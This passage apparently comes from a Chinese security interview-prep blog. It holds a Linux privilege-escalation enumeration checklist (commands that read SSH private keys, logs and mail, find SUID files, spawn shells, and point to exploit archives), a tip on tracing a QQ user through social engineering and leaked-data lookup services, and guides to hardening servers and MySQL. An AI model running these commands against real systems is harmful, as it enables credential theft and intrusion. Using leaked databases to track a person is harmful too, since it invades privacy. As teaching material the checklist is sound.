cat ~&#x2F;.php_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以找到什么样的用户信息</p>
<pre class="line-numbers language-none"><code class="language-none">cat ~&#x2F;.bashrc
cat ~&#x2F;.profile
cat &#x2F;var&#x2F;mail&#x2F;root
cat &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>private-key 信息能否被发现？</p>
<pre class="line-numbers language-none"><code class="language-none">cat ~&#x2F;.ssh&#x2F;authorized_keys
cat ~&#x2F;.ssh&#x2F;identity.pub
cat ~&#x2F;.ssh&#x2F;identity
cat ~&#x2F;.ssh&#x2F;id_rsa.pub
cat ~&#x2F;.ssh&#x2F;id_rsa
cat ~&#x2F;.ssh&#x2F;id_dsa.pub
cat ~&#x2F;.ssh&#x2F;id_dsa
cat &#x2F;etc&#x2F;ssh&#x2F;ssh_config
cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config
cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub
cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key
cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub
cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key
cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub
cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 文件系统</p>
<p> 哪些用户可以写配置文件在&#x2F; etc &#x2F;？能够重新配置服务？</p>
<pre class="line-numbers language-none"><code class="language-none">ls -aRl &#x2F;etc&#x2F; | awk ‘$1 ~ &#x2F;^.*w.*&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null     # Anyone
ls -aRl &#x2F;etc&#x2F; | awk ’$1 ~ &#x2F;^..w&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null        # Owner
ls -aRl &#x2F;etc&#x2F; | awk ‘$1 ~ &#x2F;^.....w&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null    # Group
ls -aRl &#x2F;etc&#x2F; | awk ’;$1 ~ &#x2F;w.$&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null          # Other
find &#x2F;etc&#x2F; -readable -type f 2&gt;&#x2F;dev&#x2F;null                         # Anyone
find &#x2F;etc&#x2F; -readable -type f -maxdepth 1 2&gt;&#x2F;dev&#x2F;null   # Anyone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在&#x2F; var &#x2F;有什么可以发现？</p>
<pre class="line-numbers language-none"><code class="language-none">ls -alh &#x2F;var&#x2F;log
ls -alh &#x2F;var&#x2F;mail
ls -alh &#x2F;var&#x2F;spool
ls -alh &#x2F;var&#x2F;spool&#x2F;lpd
ls -alh &#x2F;var&#x2F;lib&#x2F;pgsql
ls -alh &#x2F;var&#x2F;lib&#x2F;mysql
cat &#x2F;var&#x2F;lib&#x2F;dhcp3&#x2F;dhclient.leases<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>网站上的任何隐藏配置&#x2F;文件?配置文件与数据库信息？</p>
<pre class="line-numbers language-none"><code class="language-none">ls -alhR &#x2F;var&#x2F;www&#x2F;
ls -alhR &#x2F;srv&#x2F;www&#x2F;htdocs&#x2F;
ls -alhR &#x2F;usr&#x2F;local&#x2F;www&#x2F;apache22&#x2F;data&#x2F;
ls -alhR &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;
ls -alhR &#x2F;var&#x2F;www&#x2F;html&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有什么在日志文件里?（什么能够帮助到“本地文件包含”?)</p>
<pre class="line-numbers language-none"><code class="language-none"># http:&#x2F;&#x2F;www.thegeekstuff.com&#x2F;2011&#x2F;08&#x2F;linux-var-log-files&#x2F;
cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log
cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log
cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error_log
cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error.log
cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log
cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log
cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error_log
cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log
cat &#x2F;var&#x2F;log&#x2F;apache&#x2F;access_log
cat &#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log
cat &#x2F;var&#x2F;log&#x2F;auth.log
cat &#x2F;var&#x2F;log&#x2F;chttp.log
cat &#x2F;var&#x2F;log&#x2F;cups&#x2F;error_log
cat &#x2F;var&#x2F;log&#x2F;dpkg.log
cat &#x2F;var&#x2F;log&#x2F;faillog
cat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log
cat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log
cat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log
cat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error.log
cat &#x2F;var&#x2F;log&#x2F;lastlog
cat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;access.log
cat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;error.log
cat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;lighttpd.access.log
cat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;lighttpd.error.log
cat &#x2F;var&#x2F;log&#x2F;messages
cat &#x2F;var&#x2F;log&#x2F;secure
cat &#x2F;var&#x2F;log&#x2F;syslog
cat &#x2F;var&#x2F;log&#x2F;wtmp
cat &#x2F;var&#x2F;log&#x2F;xferlog
cat &#x2F;var&#x2F;log&#x2F;yum.log
cat &#x2F;var&#x2F;run&#x2F;utmp
cat &#x2F;var&#x2F;webmin&#x2F;miniserv.log
cat &#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log
cat &#x2F;var&#x2F;www&#x2F;logs&#x2F;access.log
ls -alh &#x2F;var&#x2F;lib&#x2F;dhcp3&#x2F;
ls -alh &#x2F;var&#x2F;log&#x2F;postgresql&#x2F;
ls -alh &#x2F;var&#x2F;log&#x2F;proftpd&#x2F;
ls -alh &#x2F;var&#x2F;log&#x2F;samba&#x2F;
#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,</p>
<p> mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)</p>
<p> 如果命令限制，你可以打出哪些突破它的限制？</p>
<pre class="line-numbers language-none"><code class="language-none">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;
echo os.system(&#39;&#x2F;bin&#x2F;bash&#39;)
&#x2F;bin&#x2F;sh -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如何安装文件系统？</p>
<pre class="line-numbers language-none"><code class="language-none">mount
df -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>是否有挂载的文件系统？</p>
<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;fstab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>什么是高级Linux文件权限使用？Sticky bits, SUID 和GUID</p>
<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -1000 -type d 2&gt;&#x2F;dev&#x2F;null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
find &#x2F; -perm -g&#x3D;s -o -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null    # SGID or SUID
for i in &#96;locate -r &quot;bin$&quot;&#96;; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2&gt;&#x2F;dev&#x2F;null; done    #
Looks in &amp;#039;common&amp;#039; places: &#x2F;bin, &#x2F;sbin, &#x2F;usr&#x2F;bin, &#x2F;usr&#x2F;sbin,
&#x2F;usr&#x2F;local&#x2F;bin, &#x2F;usr&#x2F;local&#x2F;sbin and any other *bin, for SGID or SUID
(Quicker search)
#
findstarting at root (&#x2F;), SGIDorSUID, not Symbolic links, only 3
folders deep, list with more detail and hideany errors (e.g. permission
denied)
find&#x2F;-perm -g&#x3D;s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld &#123;&#125; ;2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 在哪些目录可以写入和执行呢？几个“共同”的目录：&#x2F; tmp目录，&#x2F;var &#x2F; tmp目录&#x2F; dev &#x2F;shm目录</p>
<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null        # world-writeable folders
find &#x2F; -perm -222 -type d 2&gt;&#x2F;dev&#x2F;null      # world-writeable folders
find &#x2F; -perm -o+w -type d 2&gt;&#x2F;dev&#x2F;null    # world-writeable folders
find &#x2F; -perm -o+x -type d 2&gt;&#x2F;dev&#x2F;null    # world-executable folders
find &#x2F; ( -perm -o+w -perm -o+x ) -type d 2&gt;&#x2F;dev&#x2F;null   # world-writeable &amp; executable folders
Any &quot;problem&quot; files？可写的的，“没有使用&quot;的文件
find &#x2F; -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print   # world-writeable files
find &#x2F;dir -xdev ( -nouser -o -nogroup ) -print   # Noowner files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 准备和查找漏洞利用代码</p>
<p> 安装了什么开发工具&#x2F;语言&#x2F;支持？</p>
<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name perl*
find &#x2F; -name python*
find &#x2F; -name gcc*
find &#x2F; -name cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如何上传文件？</p>
<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name wget
find &#x2F; -name nc*
find &#x2F; -name netcat*
find &#x2F; -name tftp*
find &#x2F; -name ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查找exploit代码</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.exploit-db.com

http:&#x2F;&#x2F;1337day.com

http:&#x2F;&#x2F;www.securiteam.com

http:&#x2F;&#x2F;www.securityfocus.com

http:&#x2F;&#x2F;www.exploitsearch.net

http:&#x2F;&#x2F;metasploit.com&#x2F;modules&#x2F;

http:&#x2F;&#x2F;securityreason.com

http:&#x2F;&#x2F;seclists.org&#x2F;fulldisclosure&#x2F;

http:&#x2F;&#x2F;www.google.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查找更多有关漏洞的信息</p>
<p> <a target="_blank" rel="noopener" href="http://www.cvedetails.com/">http://www.cvedetails.com</a></p>
<p> <a target="_blank" rel="noopener" href="http://packetstormsecurity.org/files/cve/[CVE]">http://packetstormsecurity.org/files/cve/[CVE]</a></p>
<p> <a target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=%5BCVE%5D%5Dhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=%5BCVE%5D">http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]]http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]</a></p>
<p> <a target="_blank" rel="noopener" href="http://www.vulnview.com/cve-details.php?cvename=%5BCVE%5D%5Dhttp://www.vulnview.com/cve-details.php?cvename=%5BCVE%5D">http://www.vulnview.com/cve-details.php?cvename=[CVE]]http://www.vulnview.com/cve-details.php?cvename=[CVE]</a></p>
<p> <a target="_blank" rel="noopener" href="http://www.91ri.org/">http://www.91ri.org/</a></p>
<p> (快速）“共同的“exploit,预编译二进制代码文件</p>
<p> <a target="_blank" rel="noopener" href="http://tarantula.by.ru/localroot/">http://tarantula.by.ru/localroot/</a></p>
<p> <a target="_blank" rel="noopener" href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a></p>
<p> 上面的信息很难吗？</p>
<p> 快去使用第三方脚本&#x2F;工具来试试吧！</p>
<p> 系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？</p>
<pre class="line-numbers language-none"><code class="language-none">apt-get update &amp;&amp; apt-get upgrade
yum update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="21-如果你查到一个qq号怎么分析攻击者"><a href="#21-如果你查到一个qq号怎么分析攻击者" class="headerlink" title="21.如果你查到一个qq号怎么分析攻击者"></a>21.如果你查到一个qq号怎么分析攻击者</h2><p>1.尝试进入其空间获取其更多信息，或者加上他的好友进行社工。 2.利用社工库查询手机号，通过手机号再反查其他平台，<br>如支付宝，阿里云等等。  </p>
<p>3.案例 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/f_TzsgM0ujWL99bEr5aRiQ">https://mp.weixin.qq.com/s/f_TzsgM0ujWL99bEr5aRiQ</a> </p>
<h2 id="22-分别讲述一下服务器、数据库、网站的安全加固"><a href="#22-分别讲述一下服务器、数据库、网站的安全加固" class="headerlink" title="22.分别讲述一下服务器、数据库、网站的安全加固"></a>22.分别讲述一下服务器、数据库、网站的安全加固</h2><h3 id="服务器加固"><a href="#服务器加固" class="headerlink" title="服务器加固"></a>服务器加固</h3><p>原文：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/97a2ee6aa9d1?from=timeline">https://www.jianshu.com/p/97a2ee6aa9d1?from=timeline</a></p>
<ol>
<li>禁止root用户直接登陆</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">1) 编辑配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config 修改PermitRootLogin 后面的yes 为 no ,并且去掉前面的注释符
2)编辑 &#x2F;etc&#x2F;pam.d&#x2F;login文件，配置auth required pam_securetty.so
3)编辑&#x2F;etc&#x2F;passwd,账户信息的shell为&#x2F;sbin&#x2F;nologin的为禁止远程登陆，如要允许，则改成可以登陆的shell即可，如&#x2F;sbin&#x2F;bash。
4)然后重启sshd服务 service sshd restart
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>2.设置用户密码复杂度和过期时间</p>
<pre class="line-numbers language-none"><code class="language-none">是在&#x2F;etc&#x2F;login.defs文件，里面几个选项
PASS_MAX_DAYS   90  #密码最长过期天数
PASS_MIN_DAYS   80  #密码最小过期天数
PASS_MIN_LEN    10  #密码最小长度
PASS_WARN_AGE   7   #密码过期警告天数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>3.登陆超时设置</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;profile最后一行加入TMOUT&#x3D;300<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>4.系统关键文件权限设置</p>
<pre class="line-numbers language-none"><code class="language-none">通过chmod命令对目录的权限进行实际设置
&#x2F;etc&#x2F;passwd 必须所有用户都可读，root用户可写 –rw-r—r— 
&#x2F;etc&#x2F;shadow 只有root可读 –r-------- 
&#x2F;etc&#x2F;group  须所有用户都可读，root用户可写 –rw-r—r—
使用如下命令设置：
chmod 644 &#x2F;etc&#x2F;passwd
chmod 600 &#x2F;etc&#x2F;shadow
chmod 644 &#x2F;etc&#x2F;group<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>5.设置文件与目录缺省权限</p>
<pre class="line-numbers language-none"><code class="language-none">在文件&#x2F;etc&#x2F;profile中设置umask 027或UMASK 027
设置默认权限： 
vi &#x2F;etc&#x2F;login.defs， 
在末尾增加umask 027或UMASK 027，将缺省访问权限设置为750<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>6.设置ssh登录前警告Banner</p>
<pre class="line-numbers language-none"><code class="language-none">1.  执行如下命令创建ssh banner信息文件： 
#touch &#x2F;etc&#x2F;ssh_banner 
#chown bin:bin &#x2F;etc&#x2F;ssh_banner 
#chmod 644 &#x2F;etc&#x2F;ssh_banner 
#echo &quot; Authorized only. All activity will be monitored and reported &quot;&gt; &#x2F;etc&#x2F;ssh_banner 
可根据实际需要修改该文件的内容。 
2.  修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件，添加如下行： 
Banner &#x2F;etc&#x2F;ssh_banner 
3.  重启sshd服务： 
#&#x2F;etc&#x2F;init.d&#x2F;sshd restart <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>7.设置文件与目录缺省权限</p>
<pre class="line-numbers language-none"><code class="language-none">在文件&#x2F;etc&#x2F;profile中设置umask 027或UMASK 027
设置默认权限： 
vi &#x2F;etc&#x2F;login.defs， 
在末尾增加umask 027或UMASK 027，将缺省访问权限设置为750
如果服务器类型为采集服务器或应用中需要使用ftp的，需要设置umask为007，并把ftp用户组和启动应用的用户设置为同一用户组下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>8.修改ssh默认端口</p>
<pre class="line-numbers language-none"><code class="language-none"># vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config 修改
Port 17382
#service sshd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>9.限制用户su到root</p>
<pre class="line-numbers language-none"><code class="language-none">编辑su文件(vi &#x2F;etc&#x2F;pam.d&#x2F;su)，在开头添加下面两行： 
auth sufficient pam_rootok.so 和 
auth required pam_wheel.so group&#x3D;wheel 这表明只有wheel组的成员可以使用su命令成为root用户。 
你可以把用户添加到wheel组，以使它可以使用su命令成为root用户。 
添加方法为：usermod –G wheel username
备注：双方共同运维服务器，且root密码为我方知晓时设置
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>10.检查拥有suid和sgid权限的文件</p>
<pre class="line-numbers language-none"><code class="language-none">执行命令: 
find &#x2F;usr&#x2F;bin&#x2F;chage &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;wall &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;usr&#x2F;bin&#x2F;chsh &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;write &#x2F;usr&#x2F;sbin&#x2F;usernetctl &#x2F;usr&#x2F;sbin&#x2F;traceroute &#x2F;bin&#x2F;mount &#x2F;bin&#x2F;umount &#x2F;bin&#x2F;ping &#x2F;sbin&#x2F;netreport -type f -perm -04000 -o -perm -02000 -type f -xdev 2&gt;&#x2F;dev&#x2F;null 
如果存在输出结果，则使用chmod 755 文件名 命令修改文件的权限。 
例如：chmod a-s &#x2F;usr&#x2F;bin&#x2F;chage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="数据库加固"><a href="#数据库加固" class="headerlink" title="数据库加固"></a>数据库加固</h3><p>[原文](<a target="_blank" rel="noopener" href="https://www.hackbase.net/article-260336-1.html">干货！数据库安全之Mysql数据库安全加固-【黑基网】 (hackbase.net)</a>)</p>
<h4 id="账号加固"><a href="#账号加固" class="headerlink" title="账号加固"></a>账号加固</h4><p>以普通帐户安全运行mysqld，禁止mysql以<strong>root</strong>帐号权限运行。防止攻击者可能通过mysql进行提权。</p>
<p><strong>配置&#x2F;etc&#x2F;my.cnf</strong></p>
<pre class="line-numbers language-none"><code class="language-none">[mysql.server]
user&#x3D;mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402223821659.png"></p>
<p><strong>减少管理员账户</strong></p>
<p>管理员账户越多，风险越大，所以你应该保持尽可能最少的帐户数量，只有为那些真正需要它的人创建账户。如果你有很多管理员账户，那你需要定期检查并清理那些不必要的账户。</p>
<p><strong>普通用户启动</strong></p>
<p>禁止以root账号运行mysqld;</p>
<p>检测操作</p>
<p>检查进程属主和运行参数是否包含–user&#x3D;mysql类似语句：</p>
<pre class="line-numbers language-none"><code class="language-none">&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39;;
如上这种这其实是完全放开了所以ip对root的访问。所以应该把重要的操作限制给特定主机：
&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;localhost&#39;;
&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;指定ip&#39; ;
&gt; FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402223954051.png"></p>
<p><strong>新增用户</strong></p>
<p>应按照应用分配不同账号，避免不同用户间共享账号</p>
<p>创建用户 设定指定ip地址登陆数据库</p>
<pre class="line-numbers language-none"><code class="language-none">create user vvera@&#39;指定ip地址&#39;   identified by &#39;vv@122&#39;；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样就创建了一个名为：vvera 密码为：vv@122 的用户。然后登录一下</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224031267.png"></p>
<p><strong>删除不用的用户</strong></p>
<p>应删除或锁定与数据库运行、维护等工作无关的账号</p>
<p><strong>移除匿名账户和废弃的账户</strong></p>
<p>DROP USER语句用于删除一个或多个MySQL账户。要使用DROP USER，必须拥有mysql数据库的全局CREATE USER权限或DELETE权限。账户名称的用户和主机部分与用户表记录的User和Host列值相对应。使用DROP USER，您可以取消一个账户和其权限，操作如下：</p>
<pre class="line-numbers language-none"><code class="language-none"># ps –ef | grep mysqld
#grep -i user &#x2F;etc&#x2F;my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>该语句可以删除来自所有授权表的帐户权限记录。红色标识的无用账户都可以删除。</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224111829.png"></p>
<p>使用操作命令之后的结果</p>
<pre class="line-numbers language-none"><code class="language-none">drop user &#39;&#39;@&#39;mysql&#39;,&#39;&#39;@&#39;localhost&#39;,&#39;root&#39;@&#39;::1&#39;,&#39;root&#39;@&#39;mysql&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224142129.png"></p>
<p><strong>说明</strong></p>
<p>DROP USER不能自动关闭任何打开的用户对话。而且，如果用户有打开的对话，此时取消用户，则命令不会生效，直到用户对话被关闭后才生效。一旦对话被关闭，用户也被取消，此用户再次试图登录时将会失败。</p>
<p>检测操作：mysql 查看所有用户</p>
<pre class="line-numbers language-none"><code class="language-none">create user vvera@&#39;指定ip地址&#39;   identified by &#39;safe6@2020!&#39;；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224251586.png"></p>
<p>依次检查所列出的账户是否为必要账户，删除无用户或过期账户。</p>
<p><strong>注意：仔细核对，防止误删</strong></p>
<h4 id="口令策略加固"><a href="#口令策略加固" class="headerlink" title="口令策略加固"></a>口令策略加固</h4><p><strong>检查帐户默认密码和弱密码，建议使用5.7之后版本提高安全性</strong></p>
<p>修改帐户<strong>弱密码</strong>如要修改密码，执行如下命令：检查本地密码：(注意，5.7之前管理帐号root默认是空密码)</p>
<pre class="line-numbers language-none"><code class="language-none">mysql&gt; update user set password&#x3D;password(&#39;vv@122&#39;) where user&#x3D;&#39;root&#39;;
mysql&gt; flush privileges;
检测方法
mysql&gt; use mysql;
mysql&gt; select Host,User,Password,Select_priv,Grant_priv from user;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224413591.png"></p>
<h4 id="用户权限加固"><a href="#用户权限加固" class="headerlink" title="用户权限加固"></a>用户权限加固</h4><p>在数据库权限配置能力内，根据用户的业务需要，配置其所需的最小权限。</p>
<h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><p>有些应用程序是通过一个特定数据库表的用户名和口令连接到MySQL的，安全人员不应当给予这个用户完全的访问权。如果攻击者获得了这个拥有完全访问权的用户，他也就拥有了所有的数据库。查看一个用户许可的方法是在MySQL控制台中使用命令<strong>SHOW GRANT</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&gt;SHOW GRANTS FOR ; &#39;vvera&#39;@&#39;localhost&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">为定义用户的访问权，使用GRANT命令。在下面的例子中，vvera仅能从tanggula数据库的mserver表中选择：
&gt; GRANT SELECT ON tanggula. mserver TO &#39;vvera&#39;@&#39;localhost&#39;;
&gt; FLUSH PRIVILEGES;
vvera用户就无法改变数据库中这个表和其它表的任何数据。
如果你要从一个用户移除访问权，就应使用一个与GRANT命令类似的REVOKE命令：
&gt; REVOKE SELECT ON tanggula. mserver FROM &#39;vvera&#39;@&#39;localhost&#39;;
&gt; FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>权限权限范围给谁授权权限范围grant allON .to vvera授权vvera全库权限grant selectON tanggula.*to vvera授权vvera唐古拉数据库查看权限grant createON tanggula.*to vvera授权vvera数据库添加权限</p>
<p>授权并创建用户，并指定密码</p>
<pre class="line-numbers language-none"><code class="language-none">grant 权限 on 权限范围  to 用户 identified by &#39;密码&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<p>回收权限revoke 权限 on 范围 from 用户</p>
<h4 id="日志审计加固"><a href="#日志审计加固" class="headerlink" title="日志审计加固"></a>日志审计加固</h4><p>数据库配置日志功能(切记不要用root用户，防止日志写shell)</p>
<pre class="line-numbers language-none"><code class="language-none">show variables like &#39;log_%&#39;;查看所有的log命令 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224519449.png"></p>
<pre class="line-numbers language-none"><code class="language-none">show variables like &#39;log_bin&#39;;查看具体的log命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224544048.png"></p>
<p>启用日志记录让你可以检测服务器上的活动，这样你就可以分析失败的登录尝试和敏感文件的访问记录，以便了解是否存在向你的服务器和数据库发起的恶意活动。<br>你只需要把log &#x3D;&#x2F;var&#x2F;log&#x2F;mylogfile指令添加到MySQL配置文件中，就可以手动启用日志记录功能。<br>日志记录仅适用于查询数量有限的数据库服务器。对于信息量大的服务器，这可能会导致高过载。</p>
<h4 id="禁用或限制远程访问"><a href="#禁用或限制远程访问" class="headerlink" title="禁用或限制远程访问"></a>禁用或限制远程访问</h4><p>尽可能的禁止远程网络连接，防止猜解密码攻击，溢出攻击和嗅探攻击。</p>
<p><strong>远程访问</strong></p>
<p>直接通过<strong>本机</strong>之外的计算机改变生产环境中的数据库是异常危险的。</p>
<p>有时，管理员会打开远程主机对数据库的访问(<strong>应当设置为指定ip</strong>)：</p>
<pre class="line-numbers language-none"><code class="language-none">&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39;;
如上这种这其实是完全放开了所以ip对root的访问。所以应该把重要的操作限制给特定主机：
&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;localhost&#39;;
&gt; GRANT ALL ON *.* TO &#39;root&#39;@&#39;指定ip&#39; ;
&gt; FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402224622293.png"></p>
<p>如果数据库不需远程访问，可以禁止远程tcp&#x2F;ip连接, 通过在mysqld服务器中参数中添加 –skip-networking 启动参数来使mysql不监听任何TCP&#x2F;IP连接，增加安全性。强迫MySQL仅监听本机，方法是在my.cnf的[mysqld]部分增加下面一行：bind-address&#x3D;127.0.0.1</p>
<p>如果非要开启远程访问，建议设置指定ip连接。</p>
